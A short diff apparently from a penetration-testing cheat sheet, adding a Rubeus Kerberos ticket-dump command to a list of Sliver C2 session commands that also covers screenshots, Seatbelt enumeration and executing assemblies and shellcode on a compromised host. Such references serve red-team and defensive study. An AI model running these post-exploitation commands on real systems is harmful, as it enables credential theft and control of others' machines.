@@ -904,6 +904,7 @@ sliver (NEARBY_LANGUAGE) > interactive                                    // int
 sliver (NEARBY_LANGUAGE) > screenshot                                     // create a screenshot
 sliver (NEARBY_LANGUAGE) > background                                     // background the session
 sliver (NEARBY_LANGUAGE) > seatbelt -- -group=getsystem                   // execute from armory with parameter
+sliver (NEARBY_LANGUAGE) > rubeus -- dump /nowrap                         // execute from armory with parameter
 sliver (NEARBY_LANGUAGE) > execute-assembly <FILE>.exe uac                // execute a local binary
 sliver (NEARBY_LANGUAGE) > execute-shellcode <FILE>.bin uac               // execute a local binary
 ```
